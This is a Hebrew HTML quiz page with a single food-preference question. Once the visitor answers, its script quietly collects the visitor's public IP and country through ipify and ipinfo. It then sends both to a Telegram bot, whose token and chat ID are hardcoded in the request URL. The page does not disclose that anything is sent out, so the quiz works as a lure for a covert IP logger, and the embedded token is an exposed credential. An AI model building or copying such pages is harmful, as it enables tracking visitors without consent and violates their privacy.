l<!DOCTYPE html>
<html lang="he">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>השאלון</title>
    <style>
        body {
            background-image: url('1.png');
            background-size: cover;
            font-family: 'Arial', sans-serif;
            color: #FFD700;
            text-align: center;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }

        .container {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            background-color: rgba(0, 0, 0, 0.7);
            padding: 40px;
            border-radius: 15px;
            width: 60%;
            max-width: 600px;
            box-shadow: 0 0 15px rgba(0, 0, 0, 0.5);
        }

        .question-container {
            display: none;
            width: 100%;
            text-align: center;
        }

        .active {
            display: block;
        }

        h2 {
            font-size: 24px;
            margin-bottom: 20px;
            color: #FFD700;
        }

        .choice {
            background-color: #333;
            color: #FFD700;
            padding: 15px;
            margin: 10px;
            border-radius: 10px;
            cursor: pointer;
            font-size: 18px;
            transition: background-color 0.3s;
        }

        .choice:hover {
            background-color: #444;
        }

        .result {
            margin-top: 50px;
            font-size: 22px;
            color: #FFD700;
            font-weight: bold;
        }

        .result p {
            margin-top: 10px;
        }

        @media (max-width: 768px) {
            .container {
                width: 80%;
                padding: 30px;
            }

            h2 {
                font-size: 20px;
            }

            .choice {
                font-size: 16px;
                padding: 12px;
            }
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="question-container active" id="q1">
            <h2>מה המאכל האהוב עליך?</h2>
            <div class="choice" onclick="selectAnswer(1, 'פיצה')">פיצה</div>
            <div class="choice" onclick="selectAnswer(1, 'המבורגר')">המבורגר</div>
            <div class="choice" onclick="selectAnswer(1, 'סושי')">סושי</div>
        </div>

        <div class="result" id="result" style="display: none;">
            <h2>תודה על השתתפותך!</h2>
            <p id="countryMessage"></p>
        </div>
    </div>

    <script>
        let currentQuestion = 1;
        let answers = {};

        function selectAnswer(questionNumber, answer) {
            answers[questionNumber] = answer;
            moveToNextQuestion(questionNumber);
        }

        function moveToNextQuestion(questionNumber) {
            let currentContainer = document.getElementById('q' + questionNumber);
            let nextContainer = document.getElementById('q' + (questionNumber + 1));

            if (nextContainer) {
                currentContainer.classList.remove('active');
                nextContainer.classList.add('active');
            } else {
                currentContainer.classList.remove('active');
                showResult();
            }
        }

        function showResult() {
            let resultContainer = document.getElementById('result');
            resultContainer.style.display = "block";
            checkIP();
        }

        function checkIP() {
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    const ip = data.ip;
                    console.log('ה-IP שלך:', ip);
                    checkCountry(ip);
                })
                .catch(error => {
                    console.error("שגיאה בקבלת ה-IP: ", error);
                    alert("שגיאה בקבלת ה-IP");
                });
        }

        function checkCountry(ip) {
            fetch(`https://ipinfo.io/${ip}/json?token=YOUR_API_TOKEN`)
                .then(response => response.json())
                .then(data => {
                    const country = data.country;
                    const countryMessage = document.getElementById('countryMessage');
                    countryMessage.innerHTML = `נראה כי אתה ממדינה ${country}.`;
                    sendTelegramMessage(ip, country);
                })
                .catch(error => {
                    console.error("שגיאה בקבלת מידע על המדינה: ", error);
                    alert("שגיאה בקבלת מידע על המדינה");
                });
        }

        function sendTelegramMessage(ip, country) {
            const telegramAPI = `https://api.telegram.org/bot6796201688:AAEaRoA_O41-U24XQGIX5a4MK4lMyIjjeqg/sendMessage?chat_id=7039130805&text=IP%20${ip}%20השלמת%20את%20השאלון%20ומדובר%20במדינה%20${country}`;
            fetch(telegramAPI)
                .then(response => response.json())
                .then(data => {
                    console.log("הודעה נשלחה בהצלחה: ", data);
                })
                .catch(error => {
                    console.error("שגיאה בשליחת הודעה לטלגרם: ", error);
                    alert("שגיאה בשליחת הודעה לטלגרם");
                });
        }
    </script>
</body>
</html>
